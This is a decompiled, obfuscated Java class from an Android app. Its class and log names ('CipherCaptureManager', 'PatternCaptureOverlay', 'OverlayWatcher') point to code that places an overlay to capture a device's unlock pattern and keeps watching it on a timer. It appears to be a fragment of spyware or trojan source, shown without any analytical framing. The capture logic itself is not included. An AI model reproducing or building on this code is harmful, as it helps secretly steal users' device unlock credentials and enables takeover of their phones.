package com.storm.safe.rock.service.modules.cipher;

import android.os.Looper;
import java.util.concurrent.locks.ReentrantLock;
import p000.RunnableC0615ia;
import p000.rm0;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a0 */
/* loaded from: classes2.dex */
public final class RunnableC0334a0 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ C0335a1 f53282a0;

    public RunnableC0334a0(C0335a1 c0335a1) {
        this.f53282a0 = c0335a1;
    }

    @Override // java.lang.Runnable
    public final void run() {
        C0337a3 c0337a3 = this.f53282a0.f53289a3;
        if (c0337a3 == null || !c0337a3.m211845a8()) {
            C0335a1 c0335a1 = this.f53282a0;
            if (c0335a1.f53297b1) {
                c0335a1.f53289a3 = C0337a3.f53343b6.getInstance(c0335a1.f53286a0, this.f53282a0.f53287a1);
                C0335a1 c0335a12 = this.f53282a0;
                C0337a3 c0337a32 = c0335a12.f53289a3;
                if (c0337a32 != null) {
                    c0337a32.f53357b1 = new CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$1(c0335a12);
                }
                if (c0337a32 != null) {
                    c0337a32.f53358b2 = new CipherCaptureManager$tryStartPatternOverlay$5$createRunnable$1$2(c0335a12);
                }
                if (c0337a32 != null) {
                    ReentrantLock reentrantLock = c0337a32.f53350a4;
                    if (!c0337a32.m211845a8()) {
                        try {
                            if (reentrantLock.tryLock()) {
                                try {
                                    c0337a32.f53356b0 = 1;
                                    c0337a32.f53351a5.clear();
                                    if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
                                        c0337a32.m211841a4();
                                    } else {
                                        c0337a32.f53359b3.postDelayed(new rm0(c0337a32, 1), 300L);
                                    }
                                } catch (Exception e) {
                                    t60.m214704c5("PatternCaptureOverlay", "startCapture error: " + e.getMessage());
                                }
                                reentrantLock.unlock();
                            } else {
                                t60.m214726f4("PatternCaptureOverlay", "已有捕获任务在运行");
                            }
                        } catch (Throwable th) {
                            reentrantLock.unlock();
                            throw th;
                        }
                    }
                }
                C0337a3 c0337a33 = this.f53282a0.f53289a3;
                if (c0337a33 == null || !c0337a33.m211845a8()) {
                    this.f53282a0.f53304b8 = false;
                    t60.m214726f4("CipherCaptureManager", "🔷 [300ms后] PatternCaptureOverlay 未能创建，重置 pending");
                    return;
                }
                C0335a1 c0335a13 = this.f53282a0;
                c0335a13.m211823e0();
                long j = c0335a13.f53291a5;
                t60.m214714d6("CipherCaptureManager", "🔷 [OverlayWatcher] 启动定时检测 (间隔=" + j + "ms)");
                RunnableC0615ia runnableC0615ia = new RunnableC0615ia(c0335a13, 0);
                c0335a13.f53290a4 = runnableC0615ia;
                c0335a13.f53294a8.postDelayed(runnableC0615ia, j);
                return;
            }
        }
        t60.m214702c3("CipherCaptureManager", "🔷 [300ms后] 条件不满足，跳过创建");
        C0337a3 c0337a34 = this.f53282a0.f53289a3;
        if (c0337a34 == null || !c0337a34.m211845a8()) {
            this.f53282a0.f53304b8 = false;
        }
    }
}
